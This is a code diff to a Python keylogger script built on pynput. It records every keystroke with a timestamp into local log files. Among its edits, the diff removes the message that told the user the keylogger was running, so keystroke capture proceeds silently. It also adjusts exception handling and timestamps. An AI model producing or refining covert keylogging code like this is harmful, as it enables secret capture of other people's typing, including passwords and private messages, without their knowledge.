@@ -10,16 +10,16 @@ def on_press(key):
         else:
             log.append(key.char + ',' + d + '\n')
     except AttributeError:
+        d = time.strftime("%Y/%m/%d,%H:%M:%S")
         # if key == keyboard.Key.space:
         log.append('Key.space' + ',' + d + '\n')
     if key == keyboard.Key.esc:
         # Stop listener
-        raise Exit
+        raise keyboard.Listener.StopException
 
 def start_wisper():
     if not os.path.exists("logs"):
         os.makedirs("logs")
-    print("You've started the keylogger. Press your escape key to stop logging.")
     global log
     log = []
     with keyboard.Listener(on_press=on_press) as listener:
@@ -30,4 +30,7 @@ def start_wisper():
             filek.write(str(key))
 
 if __name__ == "__main__":
-    start_wisper()
+    try:
+        start_wisper()
+    except:
+        filek.close()
